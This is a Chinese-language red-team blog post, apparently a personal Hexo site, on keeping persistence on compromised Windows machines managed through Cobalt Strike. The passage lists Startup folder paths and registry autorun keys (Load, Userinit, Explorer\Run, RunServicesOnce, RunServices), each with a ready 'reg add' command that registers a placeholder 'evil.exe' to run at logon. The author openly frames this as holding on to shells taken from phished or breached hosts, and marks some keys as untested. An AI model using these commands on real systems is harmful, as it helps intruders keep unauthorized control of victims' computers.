<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="[TOC] windows前言在红队中对于拿到的shell或钓上来的鱼，目前比较流行用CS做统一管理，但实战中发现CS官方没有集成一键权限维持的功能，收集的一些第三方开发的插件也大多不完善或者使用很麻烦，甚至有一些还有BUG导致我们以为成功了实际上却没有，最终丢掉了shell。故基于此场景整理Windows环境中的持久化方法，后续将一些比较常用且便捷的操作整合成CS插件，确保在拿到shell的时候">
<meta property="og:type" content="article">
<meta property="og:title" content="权限维持&#x2F;权限维持">
<meta property="og:url" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
<meta property="og:site_name" content="xdcty">
<meta property="og:description" content="[TOC] windows前言在红队中对于拿到的shell或钓上来的鱼，目前比较流行用CS做统一管理，但实战中发现CS官方没有集成一键权限维持的功能，收集的一些第三方开发的插件也大多不完善或者使用很麻烦，甚至有一些还有BUG导致我们以为成功了实际上却没有，最终丢掉了shell。故基于此场景整理Windows环境中的持久化方法，后续将一些比较常用且便捷的操作整合成CS插件，确保在拿到shell的时候">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15940895216157.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941759248151.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941759590158.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941759757751.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941782308073.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941803601802.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941803719088.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941805965354.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942611474268.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942611901937.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15941951175848-1609917502394.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942000886914-1609917502394.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942634946633.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942636609526.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942638861891.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/11594264666_.pic.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942829919642.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942829754223.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942830068138.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942830168238.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942830257499.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942832874448.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942833465941.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942834095268.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942834398848.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101038648.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101055410.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942878508692.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942876076891.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15942877276687.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101143617.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130101344686.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943591321052.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943597613469.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943605770806.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943606055705.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943606748189.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15943607598833.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15964352989598.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15964352245979.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15964354319199.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130094438097.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130094452496.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107091226763.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107092441963.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107092543656.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107093027572.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210106182840392.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107103644514.png">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682803207888%5B0%5D.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682816373895.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682816496340.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682816852589.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15683031490430.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15683031360757.jpg">
<meta property="og:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15683028269419.jpg">
<meta property="article:published_time" content="2021-02-20T16:59:52.630Z">
<meta property="article:modified_time" content="2021-01-30T02:21:14.222Z">
<meta property="article:author" content="cty">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15940895216157.jpg">

<link rel="canonical" href="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>权限维持/权限维持 | xdcty</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">xdcty</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">whoami</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="cty">
      <meta itemprop="description" content="whoami">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xdcty">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          权限维持/权限维持
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-02-21 00:59:52" itemprop="dateCreated datePublished" datetime="2021-02-21T00:59:52+08:00">2021-02-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-30 10:21:14" itemprop="dateModified" datetime="2021-01-30T10:21:14+08:00">2021-01-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>[TOC]</p>
<h1><span id="windows">windows</span></h1><h2><span id="前言">前言</span></h2><p>在红队中对于拿到的shell或钓上来的鱼，目前比较流行用CS做统一管理，但实战中发现CS官方没有集成一键权限维持的功能，收集的一些第三方开发的插件也大多不完善或者使用很麻烦，甚至有一些还有BUG导致我们以为成功了实际上却没有，最终丢掉了shell。<br>故基于此场景整理Windows环境中的持久化方法，后续将一些比较常用且便捷的操作整合成CS插件，确保在拿到shell的时候快速保住权限。</p>
<h2><span id="后门">后门</span></h2><h3><span id="自启动后门">自启动后门</span></h3><h4><span id="startup目录">Startup目录</span></h4><p>权限要求：提权不提权都可。</p>
<p>这是最常用也是最简单的权限维持了，放在该目录下的程序或快捷方式会在用户登录时自动运行，就不多说了。</p>
<p>NT6以后的目录如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对当前用户有效：</span><br><span class="line">C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">对所有用户有效：</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>

<p>NT6以前的目录如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对当前用户有效：</span><br><span class="line">C:\Documents and Settings\Hunter\「开始」菜单\程序\启动</span><br><span class="line">对所有用户有效：</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br></pre></td></tr></table></figure>



<h4><span id="注册键">注册键</span></h4><p>权限要求：提权不提权都可。</p>
<p>Windows庞大的注册表以及相对不严格的权限管理给了我们很多做手脚的机会，其中注册表自启项是比较常用的持久化操作了。</p>
<p>注册表作为Windows的核心数据库，存储着系统和用户的很多关键信息。</p>
<p>Windows在注册表中提供了两套独立的路径</p>
<p>​    一个是上面提到的当前用户的“HKEY_CURRENT_USER”即“HKCU”</p>
<p>​    另一个就是针对当前用户物理状态的“HKEY_LOCAL_MACHINE”即“HKLM”，仅有<code>特权账户</code>可以对其进行修改。</p>
<p>随着安全意识的提高，目前在红队中搞到的Windows大多都是降权的。特别是钓鱼得到的PC机提权的意义不大，因为即使提权写了Administrator的启动项，用户下一次登录也还是进自己的账户，持久化就白做了。</p>
<p>整理Windows下的所有注册键如下：</p>
<p>1.Load注册键</p>
<p>建一个字符串名为load键值，值为自启动程序的路径但是要注意短文件名，如C:\programfiles 应为C:\progra~1</p>
<p>据说建立run=键值也是可以的，暂时还还未测试过。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load</span><br><span class="line"></span><br><span class="line">reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v load /t REG_SZ /d "[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>

<p>2.Userinit注册键</p>
<p>通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如C:\Windows\system32\userinit.exe,evil.exe。<br>注意到路径的Notify、Shell键值也会有自启动的程序，而且其键值可以用逗号分隔，从而实现登录的时候启动多个程序。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line"></span><br><span class="line">reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit</span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>



<p>3.Explorer\Run注册键</p>
<p>Explorer\Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Run /t REG_SZ /d "[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>



<p>4.RunServicesOnce注册键</p>
<p>RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v evil /t REG_SZ /d "[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>



<p>5.RunServices注册键</p>
<p>RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v evil /t REG_SZ /d "[Absolute <span class="built_in">Path</span>]\evil.exe" /f</span><br></pre></td></tr></table></figure>

<p>6.RunOnce\Setup注册键（待确定）</p>
<p>RunOnce\Setup指定了用户登录之后运行的程序</p>
